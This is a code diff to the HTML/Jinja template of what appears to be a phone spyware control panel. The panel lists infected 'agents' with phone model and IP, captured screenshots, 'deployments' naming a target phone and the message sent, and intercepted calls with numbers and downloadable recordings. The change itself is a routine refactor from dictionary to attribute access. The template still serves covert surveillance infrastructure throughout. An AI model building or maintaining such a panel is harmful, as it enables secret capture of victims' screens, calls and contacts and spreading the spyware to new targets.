@@ -103,15 +103,15 @@
         <div class="agent-grid">
             {% for agent in agents %}
             <div class="agent-card">
-                <h3>{{ agent['agent_id'] }}</h3>
-                <p><strong>Model:</strong> {{ agent['phone_model'] or 'Unknown' }}</p>
-                <p><strong>Last Seen:</strong> {{ agent['last_seen'] or 'Never' }}</p>
-                <p><strong>Screenshots:</strong> {{ agent['screenshot_count'] }}</p>
-                <p><strong>Calls:</strong> {{ agent['call_records'] }}</p>
-                <p><strong>IP:</strong> {{ agent['ip_address'] or 'Unknown' }}</p>
+                <h3>{{ agent.agent_id }}</h3>
+                <p><strong>Model:</strong> {{ agent.phone_model or 'Unknown' }}</p>
+                <p><strong>Last Seen:</strong> {{ agent.last_seen or 'Never' }}</p>
+                <p><strong>Screenshots:</strong> {{ agent.screenshot_count or 0 }}</p>
+                <p><strong>Calls:</strong> {{ agent.call_records or 0 }}</p>
+                <p><strong>IP:</strong> {{ agent.ip_address or 'Unknown' }}</p>
                 <p><strong>Status:</strong> 
-                    <span style="color: {% if agent['status'] == 'active' %}#4CAF50{% else %}#ff4444{% endif %};">
-                        {{ agent['status']|upper }}
+                    <span style="color: {% if agent.status == 'active' %}#4CAF50{% else %}#ff4444{% endif %};">
+                        {{ agent.status|upper }}
                     </span>
                 </p>
             </div>
@@ -126,7 +126,7 @@
                 <strong>All Registered Agents:</strong>
                 {% for agent in all_agents %}
                 <div style="background: #3d3d3d; padding: 10px; margin: 5px; border-radius: 5px;">
-                    {{ agent['agent_id'] }} - {{ agent['status'] }} - Last: {{ agent['last_seen'] or 'Never' }}
+                    {{ agent.agent_id }} - {{ agent.status }} - Last: {{ agent.last_seen or 'Never' }}
                 </div>
                 {% endfor %}
             </div>
@@ -141,13 +141,13 @@
         <div class="screenshot-grid">
             {% for screenshot in screenshots %}
             <div class="screenshot-item">
-                <a href="/media/screenshot/{{ screenshot['id'] }}" target="_blank">
-                    <img src="/media/screenshot/{{ screenshot['id'] }}" alt="Screenshot" class="screenshot-img">
+                <a href="/media/screenshot/{{ screenshot.id }}" target="_blank">
+                    <img src="/media/screenshot/{{ screenshot.id }}" alt="Screenshot" class="screenshot-img">
                 </a>
                 <div style="margin-top: 10px;">
-                    <strong>{{ screenshot['agent_id'] }}</strong><br>
-                    <small>{{ screenshot['timestamp'] }}</small><br>
-                    <small>{{ screenshot['phone_model'] or 'Unknown' }}</small>
+                    <strong>{{ screenshot.agent_id }}</strong><br>
+                    <small>{{ screenshot.timestamp }}</small><br>
+                    <small>{{ screenshot.phone_model or 'Unknown' }}</small>
                 </div>
             </div>
             {% endfor %}
@@ -171,10 +171,10 @@
         {% if deployments %}
             {% for deployment in deployments %}
             <div style="background: #3d3d3d; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid var(--warning);">
-                <strong>Target:</strong> {{ deployment['target_phone'] }} | 
-                <strong>Status:</strong> {{ deployment['status'] }}<br>
-                <strong>Time:</strong> {{ deployment['timestamp'] }}<br>
-                <strong>Message:</strong> <em>{{ deployment['message_sent'][:80] }}...</em>
+                <strong>Target:</strong> {{ deployment.target_phone }} | 
+                <strong>Status:</strong> {{ deployment.status }}<br>
+                <strong>Time:</strong> {{ deployment.timestamp }}<br>
+                <strong>Message:</strong> <em>{{ deployment.message_sent[:80] }}...</em>
             </div>
             {% endfor %}
         {% else %}
@@ -187,13 +187,13 @@
         {% if calls %}
             {% for call in calls %}
             <div style="background: #3d3d3d; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid var(--primary);">
-                <strong>Agent:</strong> {{ call['agent_id'] }} | 
-                <strong>Type:</strong> {{ call['call_type'] }} | 
-                <strong>Number:</strong> {{ call['phone_number'] }}<br>
-                <strong>Duration:</strong> {{ call['duration'] }} seconds | 
-                <strong>Time:</strong> {{ call['timestamp'] }}<br>
-                {% if call['audio_data'] %}
-                <a href="/media/call/{{ call['id'] }}" style="color: var(--primary); text-decoration: none;">🔗 Download Recording</a>
+                <strong>Agent:</strong> {{ call.agent_id }} | 
+                <strong>Type:</strong> {{ call.call_type }} | 
+                <strong>Number:</strong> {{ call.phone_number }}<br>
+                <strong>Duration:</strong> {{ call.duration }} seconds | 
+                <strong>Time:</strong> {{ call.timestamp }}<br>
+                {% if call.audio_data %}
+                <a href="/media/call/{{ call.id }}" style="color: var(--primary); text-decoration: none;">🔗 Download Recording</a>
                 {% endif %}
             </div>
             {% endfor %}
